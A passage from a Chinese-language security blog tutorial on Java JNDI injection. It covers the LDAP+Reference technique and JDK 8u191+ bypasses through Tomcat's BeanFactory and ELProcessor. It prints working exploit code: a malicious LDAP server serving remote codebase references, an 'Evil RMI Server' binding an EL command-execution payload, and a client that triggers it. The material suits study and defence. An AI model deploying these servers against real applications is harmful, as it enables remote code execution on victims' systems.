id="ldap-的-JNDI-漏洞"><a href="#ldap-的-JNDI-漏洞" class="headerlink" title="ldap 的 JNDI 漏洞"></a>ldap 的 JNDI 漏洞</h4><p>先起一个 LDAP 的服务，这里需要先在 pom.xml 中导入 <code>unboundid-ldapsdk</code> 的依赖。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;com.unboundid&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">3.2</span><span class="number">.0</span>&lt;/version&gt;  </span><br><span class="line"> &lt;scope&gt;test&lt;/scope&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>对应的 server 的代码<br><strong>LdapServer.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.jndi.ldap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;  </span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;  </span><br><span class="line"><span class="keyword">import</span> java.net.URL;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;  </span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;  </span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LdapServer</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( String[] tmp_args )</span> &#123;  </span><br><span class="line">        String[] args=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://127.0.0.1:8080/#calc&quot;</span>&#125;;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">7777</span>;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);  </span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(  </span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$  </span></span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$  </span></span><br><span class="line">                    port,  </span><br><span class="line">                    ServerSocketFactory.getDefault(),  </span><br><span class="line">                    SocketFactory.getDefault(),  </span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));  </span><br><span class="line">  </span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(args[ <span class="number">0</span> ])));  </span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);  </span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$  </span></span><br><span class="line">            ds.startListening();  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">private</span> URL codebase;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;  </span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();  </span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                sendResult(result, base, e);  </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;  </span><br><span class="line">                e1.printStackTrace();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;  </span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));  </span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);  </span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);  </span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();  </span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);  </span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;  </span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);  </span><br><span class="line">            &#125;  </span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);  </span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>); <span class="comment">//$NON-NLS-1$  </span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());  </span><br><span class="line">            result.sendSearchEntry(e);  </span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端这里和上面是差不多的，把服务替换成了 ldap，端口为服务端监听的<br><strong>JNDILdapClient.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.jndi.ldap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.RemoteObj;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDILdapClient</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();  </span><br><span class="line">        <span class="type">RemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (RemoteObj) initialContext.lookup(<span class="string">&quot;ldap://localhost:7777/remoteObj&quot;</span>);  </span><br><span class="line">        System.out.println(remoteObj.sayHello(<span class="string">&quot;hello&quot;</span>));  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后python起服务，运行服务端代码，再运行客户端代码<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041536149.png" alt="image-20230804153656113"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041537405.png" alt="image-20230804153703902"><br>这个命令执行的地方其实和上面RMI一样，只不过中间一些东西在LdapCtx类下，这里就不调试了，有兴趣可以自己再调试一下</p><blockquote><p>注意一点就是，LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。但在JDK 8u191、7u201、6u211之后，com.sun.jndi.ldap.object.trustURLCodebase属性的默认值被设置为false，对LDAP Reference远程工厂类的加载增加了限制。<br>所以，当JDK版本介于8u191、7u201、6u211与6u141、7u131、8u121之间时，我们就可以利用LDAP+Reference的技巧来进行JNDI注入的利用。<br>因此，这种利用方式的前提条件就是目标环境的JDK版本在JDK8u191、7u201、6u211以下</p></blockquote><h3 id="3-jndi-结合-CORBA"><a href="#3-jndi-结合-CORBA" class="headerlink" title="3. jndi 结合 CORBA"></a>3. jndi 结合 CORBA</h3><p>这个地方看了很多jndi注入的分析文章都没提，所以这里就只了解下算了</p><blockquote><p>一个简单的流程是：<code>resolve_str</code> 最终会调用到 <code>StubFactoryFactoryStaticImpl.createStubFactory</code> 去加载远程 class 并调用 newInstance 创建对象，其内部使用的 ClassLoader 是 <code>RMIClassLoader</code>，在反序列化 stub 的上下文中，默认不允许访问远程文件，因此这种方法在实际场景中比较少用。所以就不深入研究了。</p></blockquote><h2 id="高版本-jdk-绕过"><a href="#高版本-jdk-绕过" class="headerlink" title="高版本 jdk 绕过"></a>高版本 jdk 绕过</h2><h3 id="1-jdk-版本在-8u191-之前的绕过手段"><a href="#1-jdk-版本在-8u191-之前的绕过手段" class="headerlink" title="1. jdk 版本在 8u191 之前的绕过手段"></a>1. jdk 版本在 8u191 之前的绕过手段</h3><p>这里的 jdk 版本要求为 <strong>jdk8u121 &lt; temp &lt; jdk8u191</strong><br>这里的绕过其实就是上面的jndi+ldap，算是修复的漏网之鱼，前面的版本只修复了RMI那里，所以这里就不跟了，跟着Drunkbaby佬看一下 jdk8u191 之后的版本对于这个漏洞是通过什么手段来修复的。<br><strong>修复的源码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 旧版本JDK  </span></span><br><span class="line"> <span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> className A non-null fully qualified class name.  </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> codebase A non-null, space-separated list of URL strings.  </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"> <span class="keyword">public</span> Class&lt;?&gt; loadClass(String className, String codebase)  </span><br><span class="line"> <span class="keyword">throws</span> ClassNotFoundException, MalformedURLException &#123;  </span><br><span class="line">  </span><br><span class="line"> <span class="type">ClassLoader</span> <span class="variable">parent</span> <span class="operator">=</span> getContextClassLoader();  </span><br><span class="line"> <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span>  </span><br><span class="line"> URLClassLoader.newInstance(getUrlArray(codebase), parent);  </span><br><span class="line">  </span><br><span class="line"> <span class="keyword">return</span> loadClass(className, cl);  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 新版本JDK  </span></span><br><span class="line"> <span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> className A non-null fully qualified class name.  </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> codebase A non-null, space-separated list of URL strings.  </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"> <span class="keyword">public</span> Class&lt;?&gt; loadClass(String className, String codebase)  </span><br><span class="line"> <span class="keyword">throws</span> ClassNotFoundException, MalformedURLException &#123;  </span><br><span class="line"> <span class="keyword">if</span> (<span class="string">&quot;true&quot;</span>.equalsIgnoreCase(trustURLCodebase)) &#123;  </span><br><span class="line"> <span class="type">ClassLoader</span> <span class="variable">parent</span> <span class="operator">=</span> getContextClassLoader();  </span><br><span class="line"> <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span>  </span><br><span class="line"> URLClassLoader.newInstance(getUrlArray(codebase), parent);  </span><br><span class="line">  </span><br><span class="line"> <span class="keyword">return</span> loadClass(className, cl);  </span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line"> <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line"> &#125;  </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>这里其实就是在使用URLClassLoader之前加了一个判断，判断trustURLCodebase是否为true，默认是false，即无法加载 codebase，只有为true才能远程加载类</p><h3 id="2-jdk-版本在-8u191-之后的绕过方式"><a href="#2-jdk-版本在-8u191-之后的绕过方式" class="headerlink" title="2. jdk 版本在 8u191 之后的绕过方式"></a>2. jdk 版本在 8u191 之后的绕过方式</h3><p>先弄环境吧，这里需要依赖tomcat里面的一些jar包，导入下面依赖</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;tomcat-dbcp&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;<span class="number">9.0</span><span class="number">.8</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;  </span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;<span class="number">9.0</span><span class="number">.8</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;  </span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;tomcat-jasper&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;<span class="number">9.0</span><span class="number">.8</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>也可以导入下面这个依赖将全部jar包都导进来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-catalina --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;8.5.91&lt;/version&gt;</span><br><span class="line">    &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>但是这里就需要把<code>&lt;scope&gt;provided&lt;/scope&gt;</code>这一行注释掉，不然运行服务端的时候就会遇到如下报错<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041537726.png" alt="image-20230804153745577"></p><blockquote><p>这里我们主要的攻击方式是 <strong>利用本地恶意 Class 作为Reference Factory</strong></p></blockquote><h4 id="绕过手法一：使用本地的Reference-Factory类"><a href="#绕过手法一：使用本地的Reference-Factory类" class="headerlink" title="绕过手法一：使用本地的Reference Factory类"></a>绕过手法一：使用本地的Reference Factory类</h4><blockquote><p>在<code>jdk8u191</code>之后RMI和LDAP默认都不能从远程加载类,还是可以在RMI和LDAP中获取对象。在前面我们分析过<code>javax.naming.spi.NamingManager#getObjectFactoryFromReference</code>方法,会先从本地的CLASSPATH中寻找该类,如果没有才会去远程加载。之后会执行静态代码块、代码块、无参构造函数和getObjectInstance方法。那么只需要在攻击者本地CLASSPATH找到这个Reference Factory类并且在这四个地方其中一块能执行payload就可以了。</p></blockquote><p>Michael Stepankin作者找到的是这个 <code>org.apache.naming.factory.BeanFactory</code> 类，其满足上述条件并存在于 Tomcat8 依赖包中，应用广泛。该类的 <code>getObjectInstance()</code> 函数中会通过反射的方式实例化 Reference 所指向的任意 Bean Class(Bean Class 就类似于我们之前说的那个 CommonsBeanUtils 这种)，并且会调用 setter 方法为所有的属性赋值。而该 Bean Class 的类名、属性、属性值，全都来自于 Reference 对象，均是攻击者可控的。<br>这里具体依赖 Tomcat 中的 jar 包为：catalina.jar、el-api.jar、jasper-el.jar<br>先贴代码再调试分析一下吧，服务端代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;  </span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// JNDI 高版本 jdk 绕过服务端  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIbypass</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;[*]Evil RMI Server is Listening on port: 1099&quot;</span>);  </span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry( <span class="number">1099</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory  </span></span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>,  </span><br><span class="line">                <span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 强制将&#x27;x&#x27;属性的setter从&#x27;setX&#x27;变为&#x27;eval&#x27;, 详细逻辑见BeanFactory.getObjectInstance代码  </span></span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 利用表达式执行命令  </span></span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;)&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;.newInstance().getEngineByName(\&quot;JavaScript\&quot;)&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;.eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));  </span><br><span class="line">        System.out.println(<span class="string">&quot;[*]Evil command: calc&quot;</span>);  </span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ref);  </span><br><span class="line">        registry.bind(<span class="string">&quot;Object&quot;</span>, referenceWrapper);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里利用rebind也行，白日梦组长就是用的rebind代码如下，但是运行这个的话就得用最上面的依赖，不然就会报错，这个报错怎么解决我也不知道，所以最好还是选择最上面的依赖吧</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIbypassRebind</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();  </span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>,<span class="literal">null</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,  </span><br><span class="line">                <span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span> );  </span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));  </span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;Runtime.getRuntime().exe(&#x27;calc&#x27;)&quot;</span> ));  </span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, resourceRef);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIbypassClient</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="string">&quot;rmi://localhost:1099/Object&quot;</span>;  </span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();  </span><br><span class="line">        context.lookup(uri);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041538047.png" alt="image-20230804153809511"><br>下面开始调试分析一下，如果没有InitialContext这个类的源码就直接在下面这里下断点，不然一开始的lookup就进不来和前面一样<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308041538078.png" alt="image-20230804153835689"><br>进入这个decodeObject，这里面调用了getObjectInstance<br><img 